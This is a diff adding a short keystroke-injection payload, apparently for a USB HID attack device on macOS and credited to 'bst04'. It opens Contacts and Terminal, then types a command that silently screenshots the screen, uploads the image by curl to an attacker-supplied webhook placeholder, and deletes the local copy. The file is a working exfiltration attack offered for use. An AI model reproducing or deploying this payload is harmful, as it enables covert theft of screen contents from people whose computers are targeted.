@@ -1,0 +1,23 @@
+REM =========================
+REM payload by bst04.
+REM =========================
+
+
+DELAY 1000
+GUI SPACE
+DELAY 250
+STRING CONTACTS
+DELAY 250
+ENTER
+DELAY 500
+GUI SHIFT m
+DELAY 250
+GUI SPACE
+DELAY 250
+STRING TERMINAL
+DELAY 250
+STRING screencapture -x screenshot.png && curl -X POST -H "Content-Type: multipart/form-data" -F "file=@screenshot.png" "YOUR_WEBHOOK" && rm screenshot.png
+DELAY 850
+ENTER
+DELAY 500
+GUI q
